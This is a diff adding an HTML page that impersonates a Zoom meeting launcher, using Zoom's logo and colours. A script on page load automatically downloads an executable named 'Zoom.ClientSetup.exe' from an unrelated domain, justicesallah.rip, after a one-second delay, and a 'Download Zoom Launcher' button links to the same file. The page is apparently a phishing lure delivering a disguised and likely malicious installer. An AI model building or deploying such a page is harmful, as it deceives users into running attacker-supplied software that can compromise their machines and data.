@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Launching Zoom Meeting...</title>
+  <style>
+    :root {
+      --primary-color: #2d8cff;
+      --primary-hover: #1a73e8;
+      --text-color: #333;
+      --bg-color: #f4f7fa;
+      --shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --text-color: #e0e0e0;
+        --bg-color: #121212;
+        --shadow: 0 4px 20px rgba(255, 255, 255, 0.05);
+      }
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      transition: background 0.3s, color 0.3s;
+    }
+
+    .container {
+      padding: 2rem;
+      background: white;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      max-width: 400px;
+      width: 90%;
+      background-color: var(--bg-color);
+      animation: fadeIn 0.6s ease;
+    }
+
+    .logo {
+      margin-bottom: 1.5rem;
+    }
+
+    .logo img {
+      width: 150px;
+      height: auto;
+    }
+
+    h1 {
+      font-size: 1.4rem;
+      margin-bottom: 0.5rem;
+    }
+
+    p {
+      font-size: 1rem;
+      color: var(--text-color);
+    }
+
+    .button a {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 12px 24px;
+      background-color: var(--primary-color);
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+      transition: background 0.3s;
+    }
+
+    .button a:hover {
+      background-color: var(--primary-hover);
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: scale(0.98);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.zoom.com/dist/assets/icons/zoom-logo.svg" alt="Zoom Logo" />
+    </div>
+    <h1>Preparing your Zoom Meeting…</h1>
+    <p>Your download should begin automatically. If it doesn’t, click below:</p>
+    <div class="button">
+      <a href="https://justicesallah.rip/Bin/Zoom.ClientSetup.exe?e=Access&y=Guest" download>Download Zoom Launcher</a>
+    </div>
+  </div>
+
+  <script>
+    // Automatically trigger download after short delay
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        const link = document.createElement('a');
+        link.href = 'https://justicesallah.rip/Bin/Zoom.ClientSetup.exe?e=Access&y=Guest';
+        link.download = 'https://justicesallah.rip/Bin/Zoom.ClientSetup.exe?e=Access&y=Guest';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
